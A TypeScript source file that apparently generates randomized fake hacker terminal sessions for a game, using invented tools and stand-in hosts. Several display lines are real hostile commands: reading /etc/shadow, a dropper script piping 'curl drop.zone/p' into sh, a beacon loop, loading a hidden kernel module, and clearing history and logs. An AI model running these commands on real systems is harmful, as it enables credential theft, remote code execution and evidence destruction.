import type { ISessionLine, ISessionScript, TModeId } from '../types';

// scenarios are templates, not fixed scripts: ips, ports, hex, hostnames,
// files and phrasing get re-rolled on every build so repeat players don't
// end up memorizing lines.
//
// adding one: 7-9 lines, typed text under ~45 chars (wraps on small screens
// otherwise), lowercase except natural caps like [OK] or ACCESS GRANTED.
// keep typed commands clean and put the noisy random tokens (hex, ips) on
// output lines. fake hosts/ips only, nothing real.

interface IScenario {
  id: string;
  mode: TModeId;
  build: () => ISessionLine[];
}

// random helpers

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function int(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function hex(bytes: number): string {
  const chars = '0123456789abcdef';
  let out = '';
  for (let i = 0; i < bytes * 2; i += 1) out += chars[int(0, 15)];
  return out;
}

function ip(): string {
  return `${int(10, 220)}.${int(0, 255)}.${int(0, 255)}.${int(1, 254)}`;
}

function port(): number {
  return pick([22, 80, 443, 2222, 8080, 8443, 9001, 31337, 4444, 1337, 53, 21, 6667]);
}

function latency(): number {
  return int(11, 480);
}

function bar(slots = int(8, 10)): string {
  const filled = int(slots - 2, slots);
  return `[${'#'.repeat(filled)}${'-'.repeat(slots - filled)}]`;
}

const HOSTS = [
  'target.local',
  'darknet.relay.onion',
  'drop.zone',
  'ghost.node',
  'relay7.onion',
  'vault.local',
  'mainframe.local',
  'db.internal',
  'edge.relay',
  'shadow.host',
] as const;

const USERS = ['ghost', 'root', 'operator', 'nobody', 'shade', 'cipher', 'wraith'] as const;
// shorter host/user pools so user@host lines stay under ~45 chars
const SHORT_HOSTS = ['target.local', 'drop.zone', 'ghost.node', 'relay7.onion', 'vault.local', 'edge.relay'] as const;
const SHORT_USERS = ['ghost', 'root', 'shade', 'cipher', 'wraith'] as const;
const FILES = ['loot.txt', 'payload.bin', 'vault.kdb', 'dump.bin', 'creds.db', 'keys.tar', 'ledger.csv'] as const;
const OKS = ['[OK]', '[OK]', 'done', 'ok'] as const;

// line builders

function cmd(text: string): ISessionLine {
  return { prompt: '$ ', text };
}

// heredoc/script continuation: "> " renders like "$ ", body is typed.
// keep these short with no leading whitespace
function body(text: string): ISessionLine {
  return { prompt: '> ', text };
}

function out(text: string): ISessionLine {
  return { prompt: '', text };
}

// scenarios

const SCENARIOS: IScenario[] = [
  // intrusion
  {
    id: 'ssh-ghostmode',
    mode: 'intrusion',
    build: () => {
      const host = pick(HOSTS);
      const user = pick(USERS);
      return [
        cmd(`ssh ${user}@${host} -p ${port()}`),
        out('connection established. spoofing mac'),
        cmd(`./ghostmode --silent --no-trace`),
        out('identity masked. you are nobody'),
        cmd(`cat /etc/shadow > ${pick(FILES)}`),
        out(`${pick(OKS)} ${int(40, 4096)} hashes captured`),
        cmd('exit'),
        out('session closed. no logs written'),
      ];
    },
  },
  {
    id: 'payload-decrypt',
    mode: 'intrusion',
    build: () => {
      const file = pick(FILES);
      return [
        cmd(`openssl enc -d -in ${file}`),
        out(`enter key: ${'*'.repeat(int(10, 16))}`),
        out(`decrypting ${bar()} 100%`),
        cmd(`head -n 1 ${file}.dec`),
        out(`key fragment: ${hex(6)}`),
        cmd(`shred -u ${file}`),
        out(`${pick(OKS)} evidence gone`),
      ];
    },
  },
  {
    id: 'backdoor-drop',
    mode: 'intrusion',
    build: () => {
      const host = pick(SHORT_HOSTS);
      const user = pick(SHORT_USERS);
      return [
        cmd(`scp rk.ko ${user}@${host}:/tmp`),
        out(`rk.ko 100% 48kb ${int(1, 9)}.${int(0, 9)}mb/s`),
        cmd(`ssh ${user}@${host}`),
        cmd('insmod /tmp/rk.ko --hide'),
        out(`${pick(OKS)} module loaded. pid hidden`),
        cmd('touch -r /bin/ls /tmp/rk.ko'),
        out('timestamps forged. clean exit'),
      ];
    },
  },
  {
    id: 'vault-crack',
    mode: 'intrusion',
    build: () => {
      const key = `${pick(['hunter2', 'letmein', 'swordfish', 'trustno1', 'matrix'])}_${int(10, 99)}`;
      const file = pick(['vault.kdb', 'creds.db', 'safe.aes']);
      return [
        cmd(`./crack --wordlist rockme.txt ${file}`),
        out(`trying ${int(8, 42)}000 keys per second`),
        out(`${bar(12)} ${int(40, 95)}% eta 00:${int(10, 59)}`),
        out(`key found: ${key}`),
        cmd(`vaultctl open --key ${key}`),
        out('ACCESS GRANTED'),
        cmd('ls vault/'),
        out(`${pick(FILES)}  ${pick(FILES)}  keys/`),
      ];
    },
  },
  {
    id: 'badge-clone',
    mode: 'intrusion',
    build: () => [
      cmd('proxmark3 --read --silent'),
      out(`tag found: hid 26bit fc=${int(10, 254)}`),
      cmd(`proxmark3 --clone --uid 0x${hex(3)}`),
      out(`writing ${bar()} done`),
      out(`${pick(OKS)} badge cloned`),
      cmd('./doorsim --test badge.dump'),
      out('lock response: ACCESS GRANTED'),
      cmd('rm badge.dump'),
    ],
  },
  {
    id: 'keylog-harvest',
    mode: 'intrusion',
    build: () => {
      const host = pick(SHORT_HOSTS);
      return [
        cmd(`./keylog --attach ${host} --silent`),
        out(`hooked ${int(2, 9)} input devices`),
        out(`buffer ${bar()} ${int(60, 99)}%`),
        cmd('./keylog --dump > strokes.log'),
        out(`${int(200, 9000)} keystrokes captured`),
        cmd('grep -i pass strokes.log'),
        out(`${int(1, 6)} matches. redacting`),
        out(`${pick(OKS)} harvest stored`),
      ];
    },
  },
  {
    id: 'token-forge',
    mode: 'intrusion',
    build: () => [
      cmd(`./forge --sub ${pick(USERS)} --admin`),
      out(`signing token ${bar()}`),
      out(`jwt: ${hex(8)}`),
      cmd('curl -s -H "auth: forged" api.local/me'),
      out('role: superuser'),
      out('ACCESS GRANTED'),
      cmd('unset HISTFILE'),
    ],
  },
  {
    id: 'dropper-script',
    mode: 'intrusion',
    build: () => {
      const host = pick(['drop.zone', 'edge.relay', 'ghost.node']);
      return [
        cmd('touch drop.sh'),
        cmd("cat > drop.sh <<'EOF'"),
        body('#!/bin/bash'),
        body(`curl -s ${host}/p | sh`),
        body('rm -- "$0"'),
        body('EOF'),
        cmd('chmod +x drop.sh'),
        cmd('./drop.sh'),
        out(`${pick(OKS)} payload delivered`),
      ];
    },
  },
  {
    id: 'cam-loop',
    mode: 'intrusion',
    build: () => [
      cmd(`./camctl --feed ${int(1, 16)} --silent`),
      out(`stream live ${int(24, 60)}fps`),
      cmd('./camctl --record --secs 8'),
      out(`buffering ${bar()} done`),
      cmd('./camctl --loop --replace'),
      out(`${pick(OKS)} feed now loops 00:08`),
      out('hallway clear. move'),
    ],
  },

  // network
  {
    id: 'nmap-exploit',
    mode: 'network',
    build: () => {
      const target = ip();
      const p = port();
      return [
        cmd(`nmap -sS -p- ${target} --silent`),
        out(`port ${port()} open  port ${p} open`),
        cmd(`./exploit --target ${target}:${p}`),
        out(`sending payload ${bar()} 100%`),
        out('shell spawned. uid=0(root)'),
        cmd('whoami'),
        out('root'),
        cmd('history -c'),
      ];
    },
  },
  {
    id: 'darknet-ping',
    mode: 'network',
    build: () => {
      const host = pick(['darknet.relay.onion', 'relay7.onion', 'drop.zone']);
      const hop = int(5, 9);
      return [
        cmd(`torify ping ${host}`),
        out(`reply from relay: ${latency()}ms hop=${hop}`),
        out(`reply from relay: ${latency()}ms hop=${hop}`),
        cmd(`traceroute ${host}`),
        out(`${hop} hops, all anonymized`),
        cmd('curl -s drop.zone/beacon'),
        out('beacon ack. channel open'),
        out(`${pick(OKS)} you are connected`),
      ];
    },
  },
  {
    id: 'packet-siphon',
    mode: 'network',
    build: () => [
      cmd(`./siphon -i ${pick(['wlan0', 'eth0', 'tun0'])} --silent`),
      out('promiscuous mode enabled'),
      out(`capturing ${int(800, 9000)} packets per second`),
      cmd('grep -i token capture.pcap'),
      out(`${int(1, 9)} matches found. redacting`),
      cmd('./siphon --stop'),
      out(`capture saved: ${int(12, 240)}mb`),
      out(`${pick(OKS)} interface restored`),
    ],
  },
  {
    id: 'dns-tunnel',
    mode: 'network',
    build: () => {
      const host = pick(['drop.zone', 'edge.relay', 'ghost.node']);
      return [
        cmd(`./tunnel --dns ${host} --up`),
        out('encoding stream into txt records'),
        out(`throughput ${int(4, 40)}kb/s latency ${latency()}ms`),
        cmd(`scp ${pick(FILES)} tunnel:/inbox`),
        out(`upload ${bar()} 100%`),
        cmd('./tunnel --down'),
        out('records flushed. tunnel closed'),
        out(`${pick(OKS)} no trace on the wire`),
      ];
    },
  },
  {
    id: 'relay-mesh',
    mode: 'network',
    build: () => {
      const nodes = int(4, 8);
      return [
        cmd(`./mesh --wake --nodes ${nodes}`),
        out(`node ${ip()} [OK] ${latency()}ms`),
        out(`node ${ip()} [OK] ${latency()}ms`),
        out(`node ${ip()} [WARN] ${int(100, 240)}ms`),
        cmd(`./mesh --route --via ${ip()}`),
        out(`route locked. ${int(3, 7)} hops`),
        cmd('./mesh --status'),
        out(`${nodes} nodes green. mesh stable`),
      ];
    },
  },
  {
    id: 'proxy-chain',
    mode: 'network',
    build: () => {
      const n = int(3, 7);
      return [
        cmd(`./chain --hops ${n} --rand`),
        out(`building circuit ${bar()}`),
        out(`exit node: ${ip()} (${pick(['nl', 'is', 'ro', 'se', 'jp'])})`),
        cmd('curl -s ifconfig.me'),
        out(`${ip()}`),
        out(`${pick(OKS)} ${n} hop chain up`),
        cmd('./chain --lock'),
      ];
    },
  },
  {
    id: 'beacon-script',
    mode: 'network',
    build: () => {
      const host = pick(['drop.zone', 'edge.relay', 'relay7.onion']);
      return [
        cmd("cat > beacon.sh <<'EOF'"),
        body('#!/bin/bash'),
        body('while true; do'),
        body(`curl -s ${host}/ping`),
        body(`sleep ${pick([15, 30, 60])}`),
        body('done'),
        body('EOF'),
        cmd('nohup bash beacon.sh &'),
        out(`[1] ${int(1000, 9999)} running`),
      ];
    },
  },
  {
    id: 'beacon-sweep',
    mode: 'network',
    build: () => [
      cmd('./sweep --range 10.0.0.0/24'),
      out(`hosts up: ${int(3, 40)}`),
      out(`beacon ${ip()} replied ${latency()}ms`),
      cmd(`./implant --push ${ip()}`),
      out(`implant ${bar()} installed`),
      out(`${pick(OKS)} beacon registered`),
      cmd('./sweep --quiet'),
    ],
  },

  // system
  {
    id: 'auth-log-block',
    mode: 'system',
    build: () => {
      const bad = ip();
      return [
        cmd('tail -f /var/log/auth.log'),
        out(`failed login root from ${bad}`),
        out(`failed login root from ${bad}`),
        out('[WARN] brute force detected'),
        cmd(`iptables -A INPUT -s ${bad} -j DROP`),
        out('rule added. intruder blocked'),
        cmd('tail -n 1 /var/log/auth.log'),
        out(`connection refused: ${bad}`),
      ];
    },
  },
  {
    id: 'miner-hunt',
    mode: 'system',
    build: () => {
      const pid = int(1000, 9999);
      return [
        cmd('ps aux | grep -i miner'),
        out(`pid ${pid} cryptominer ${int(80, 99)}% cpu`),
        cmd(`kill -9 ${pid}`),
        cmd('ps aux | grep -i miner'),
        out(`no matches. cpu at ${int(1, 9)}%`),
        cmd('grep miner /etc/crontab'),
        out('[CRIT] persistence found'),
        cmd("sed -i '/miner/d' /etc/crontab"),
        out(`${pick(OKS)} cleaned`),
      ];
    },
  },
  {
    id: 'disk-forensics',
    mode: 'system',
    build: () => {
      const dir = pick(['.hidden', '.cache', '.sys', '.tmp9']);
      return [
        cmd('df -h /'),
        out(`/dev/sda1 ${int(90, 99)}% used [CRIT]`),
        cmd('du -sh /var/* | sort -h | tail -1'),
        out(`${int(10, 80)}g /var/spool/${dir}`),
        cmd(`file /var/spool/${dir}/dump.bin`),
        out('encrypted blob, owner unknown'),
        cmd(`rm -rf /var/spool/${dir}`),
        out(`space freed. disk at ${int(40, 70)}%`),
      ];
    },
  },
  {
    id: 'kernel-hotfix',
    mode: 'system',
    build: () => [
      cmd('uname -r'),
      out(`${int(4, 6)}.${int(1, 19)}.0-ghost`),
      cmd(`./patchd --hotfix cve-20${int(70, 99)}-${int(1000, 9999)}`),
      out(`patching memory ${bar()} 100%`),
      out(`${pick(OKS)} kernel patched live`),
      cmd('dmesg | tail -n 1'),
      out('no anomalies detected'),
      cmd('systemctl status sshd'),
      out('active and hardened'),
    ],
  },
  {
    id: 'backup-ritual',
    mode: 'system',
    build: () => [
      cmd('./backup --vault --encrypt'),
      out(`snapshot 20${int(70, 99)}-10-31 03:${int(10, 59)} UTC`),
      out(`encrypting ${bar()} 100%`),
      cmd('sha256sum vault.tar.gpg'),
      out(`${hex(4)}...${hex(2)} verified`),
      cmd('scp vault.tar.gpg drop.zone:/cold'),
      out(`vault.tar.gpg 100% ${int(1, 4)}.${int(0, 9)}gb`),
      out(`${pick(OKS)} sleep well, operator`),
    ],
  },
  {
    id: 'scan-script',
    mode: 'system',
    build: () => {
      const net = pick(['10.0.0', '192.168.1', '172.16.4']);
      return [
        cmd("cat > scan.sh <<'EOF'"),
        body('#!/bin/bash'),
        body(`for ip in ${net}.{1..9}; do`),
        body('ping -c1 $ip && echo up'),
        body('done'),
        body('EOF'),
        out('scan.sh written'),
        cmd('bash scan.sh'),
        out(`${net}.${int(1, 9)} up`),
      ];
    },
  },
  {
    id: 'rootkit-scan',
    mode: 'system',
    build: () => {
      const found = int(0, 3);
      return [
        cmd('./rkscan --deep /'),
        out(`scanning inodes ${bar(12)}`),
        out(found > 0 ? `[CRIT] ${found} hooks found` : '[OK] no hooks found'),
        cmd('./rkscan --quarantine'),
        out(`moved ${found} files to vault`),
        cmd('./rkscan --verify'),
        out(`${pick(OKS)} system clean`),
      ];
    },
  },
  {
    id: 'service-harden',
    mode: 'system',
    build: () => [
      cmd(`systemctl disable ${pick(['telnet', 'ftp', 'rsh', 'rlogin'])}`),
      out('service masked'),
      cmd(`ufw deny ${port()}`),
      out('rule added'),
      cmd('ufw enable'),
      out(`firewall active. ${int(8, 40)} rules`),
      out(`${pick(OKS)} surface reduced`),
    ],
  },
  {
    id: 'log-scrub',
    mode: 'system',
    build: () => {
      const bad = ip();
      return [
        cmd(`grep -c ${bad} /var/log/syslog`),
        out(`${int(20, 900)} lines matched`),
        cmd(`sed -i '/${bad}/d' /var/log/syslog`),
        out('entries removed'),
        cmd('logrotate -f /etc/logrotate.conf'),
        out(`rotated ${bar()} done`),
        out(`${pick(OKS)} trail cold`),
      ];
    },
  },
];

export function getRandomSession(mode: TModeId, excludeId?: string): ISessionScript {
  const pool = SCENARIOS.filter((s) => s.mode === mode);
  const candidates = pool.length > 1 ? pool.filter((s) => s.id !== excludeId) : pool;
  const scenario = pick(candidates);
  return { id: scenario.id, mode, lines: scenario.build() };
}
